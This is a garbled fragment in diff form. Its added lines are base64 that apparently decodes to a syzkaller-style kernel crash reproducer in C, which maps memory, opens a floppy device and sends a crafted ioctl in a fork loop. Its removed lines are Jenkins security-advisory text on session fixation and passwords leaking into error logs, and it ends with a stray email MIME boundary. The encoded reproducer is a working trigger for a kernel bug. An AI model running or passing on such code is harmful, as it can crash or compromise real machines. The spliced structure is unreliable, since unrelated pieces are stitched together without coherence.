+cmVhZF90KiB0aCA9ICZ0aHJlYWRzW3RocmVhZF07CiAgICAgIGlmICghdGgt
+PmNyZWF0ZWQpIHsKICAgICAgICB0aC0+Y3JlYXRlZCA9IDE7CiAgICAgICAg
+ZXZlbnRfaW5pdCgmdGgtPnJlYWR5KTsKICAgICAgICBldmVudF9pbml0KCZ0
+aC0+ZG9uZSk7CiAgICAgICAgZXZlbnRfc2V0KCZ0aC0+ZG9uZSk7CiAgICAg
+ICAgdGhyZWFkX3N0YXJ0KHRociwgdGgpOwogICAgICB9CiAgICAgIGlmICgh
+ZXZlbnRfaXNzZXQoJnRoLT5kb25lKSkKICAgICAgICBjb250aW51ZTsKICAg
+ICAgZXZlbnRfcmVzZXQoJnRoLT5kb25lKTsKICAgICAgdGgtPmNhbGwgPSBj
+YWxsOwogICAgICBfX2F0b21pY19mZXRjaF9hZGQoJnJ1bm5pbmcsIDEsIF9f
+QVRPTUlDX1JFTEFYRUQpOwogICAgICBldmVudF9zZXQoJnRoLT5yZWFkeSk7
+CiAgICAgIGV2ZW50X3RpbWVkd2FpdCgmdGgtPmRvbmUsIDUwKTsKICAgICAg
+YnJlYWs7CiAgICB9CiAgfQogIGZvciAoaSA9IDA7IGkgPCAxMDAgJiYgX19h
+dG9taWNfbG9hZF9uKCZydW5uaW5nLCBfX0FUT01JQ19SRUxBWEVEKTsgaSsr
+KQogICAgc2xlZXBfbXMoMSk7Cn0KCnN0YXRpYyB2b2lkIGV4ZWN1dGVfb25l
+KHZvaWQpOwoKI2RlZmluZSBXQUlUX0ZMQUdTIF9fV0FMTAoKc3RhdGljIHZv
+aWQgbG9vcCh2b2lkKQp7CiAgaW50IGl0ZXIgPSAwOwogIGZvciAoOzsgaXRl
+cisrKSB7CiAgICBpbnQgcGlkID0gZm9yaygpOwogICAgaWYgKHBpZCA8IDAp
+CiAgICAgIGV4aXQoMSk7CiAgICBpZiAocGlkID09IDApIHsKICAgICAgc2V0
+dXBfdGVzdCgpOwogICAgICBleGVjdXRlX29uZSgpOwogICAgICBleGl0KDAp
+OwogICAgfQogICAgaW50IHN0YXR1cyA9IDA7CiAgICB1aW50NjRfdCBzdGFy
+dCA9IGN1cnJlbnRfdGltZV9tcygpOwogICAgZm9yICg7OykgewogICAgICBp
+ZiAod2FpdHBpZCgtMSwgJnN0YXR1cywgV05PSEFORyB8IFdBSVRfRkxBR1Mp
+ID09IHBpZCkKICAgICAgICBicmVhazsKICAgICAgc2xlZXBfbXMoMSk7CiAg
+ICAgIGlmIChjdXJyZW50X3RpbWVfbXMoKSAtIHN0YXJ0IDwgNTAwMCkKICAg
+ICAgICBjb250aW51ZTsKICAgICAga2lsbF9hbmRfd2FpdChwaWQsICZzdGF0
+dXMpOwogICAgICBicmVhazsKICAgIH0KICB9Cn0KCnVpbnQ2NF90IHJbMV0g
+PSB7MHhmZmZmZmZmZmZmZmZmZmZmfTsKCnZvaWQgZXhlY3V0ZV9jYWxsKGlu
+dCBjYWxsKQp7CiAgaW50cHRyX3QgcmVzID0gMDsKICBzd2l0Y2ggKGNhbGwp
+IHsKICBjYXNlIDA6CiAgICBtZW1jcHkoKHZvaWQqKTB4MjAwMDA4NDAsICIv
+ZGV2L2ZkI1wwMDAiLCA5KTsKICAgIHJlcyA9IC0xOwogICAgcmVzID0gc3l6
+X29wZW5fZGV2KDB4MjAwMDA4NDAsIDAsIDMpOwogICAgaWYgKHJlcyAhPSAt
+MSkKICAgICAgclswXSA9IHJlczsKICAgIGJyZWFrOwogIGNhc2UgMToKICAg
+ICoodWludDMyX3QqKTB4MjAwMDAxODAgPSAweDg4OwogICAgKih1aW50NjRf
+dCopMHgyMDAwMDE4OCA9IDA7CiAgICAqKHVpbnQ2NF90KikweDIwMDAwMTkw
+ID0gMDsKICAgICoodWludDY0X3QqKTB4MjAwMDAxOTggPSAwOwogICAgKih1
+aW50NjRfdCopMHgyMDAwMDFhMCA9IDA7CiAgICAqKHVpbnQ2NF90KikweDIw
+MDAwMWE4ID0gMDsKICAgICoodWludDMyX3QqKTB4MjAwMDAxYjAgPSAwOwog
+ICAgKih1aW50OF90KikweDIwMDAwMWI0ID0gNDsKICAgICoodWludDhfdCop
+MHgyMDAwMDFiNSA9IDA7CiAgICBtZW1jcHkoKHZvaWQqKTB4MjAwMDAxYjYs
+CiAgICAgICAgICAgIlx4ODJceDI5XHgxY1x4ODZceDQ0XHgzNlx4NWNceDdh
+XHhmN1x4MWNceGZkXHgxMVx4OTBceGE4XHgzOFx4ZDgiLAogICAgICAgICAg
+IDE2KTsKICAgICoodWludDhfdCopMHgyMDAwMDFjNiA9IDA7CiAgICBtZW1z
+ZXQoKHZvaWQqKTB4MjAwMDAxYzcsIDAsIDE2KTsKICAgICoodWludDMyX3Qq
+KTB4MjAwMDAxZDggPSAweDdmZmY7CiAgICAqKHVpbnQzMl90KikweDIwMDAw
+MWRjID0gMDsKICAgICoodWludDMyX3QqKTB4MjAwMDAxZTAgPSAwOwogICAg
+Kih1aW50MzJfdCopMHgyMDAwMDFlNCA9IDA7CiAgICBzeXNjYWxsKF9fTlJf
+aW9jdGwsIHJbMF0sIDB4MjU4LCAweDIwMDAwMTgwdWwpOwogICAgYnJlYWs7
+CiAgfQp9CmludCBtYWluKHZvaWQpCnsKICBzeXNjYWxsKF9fTlJfbW1hcCwg
+MHgxZmZmZjAwMHVsLCAweDEwMDB1bCwgMHVsLCAweDMydWwsIC0xLCAwdWwp
+OwogIHN5c2NhbGwoX19OUl9tbWFwLCAweDIwMDAwMDAwdWwsIDB4MTAwMDAw
+MHVsLCA3dWwsIDB4MzJ1bCwgLTEsIDB1bCk7CiAgc3lzY2FsbChfX05SX21t
+YXAsIDB4MjEwMDAwMDB1bCwgMHgxMDAwdWwsIDB1bCwgMHgzMnVsLCAtMSwg
+MHVsKTsKICBsb29wKCk7CiAgcmV0dXJuIDA7Cn0=
 
-This behavior could be abused to create a large number of ephemeral user 
-records in memory.
-
-Accessing this URL now no longer results in a user record getting created.
-
-
-SECURITY-1158
-When signing up for a new user account on instances using Jenkins' own user 
-database, Jenkins did not invalidate the existing session and create a new 
-one. This allowed session fixation.
-
-Jenkins now invalidates the existing session and creates a new one when 
-logging in after user signup.
-
-
-SECURITY-765
-When Jenkins fails to process form submissions due to an internal error, 
-the error message shown to the user and written to the log typically 
-includes the serialized JSON form submission. Secrets, such as submitted 
-passwords, might be included with the JSON object, and shown or written to 
-disk in plain text.
-
-Jenkins now masks values in these error messages from view if they were 
-shown on the UI as password form fields.
-
+--000000000000f8f89e05ddae67d8--
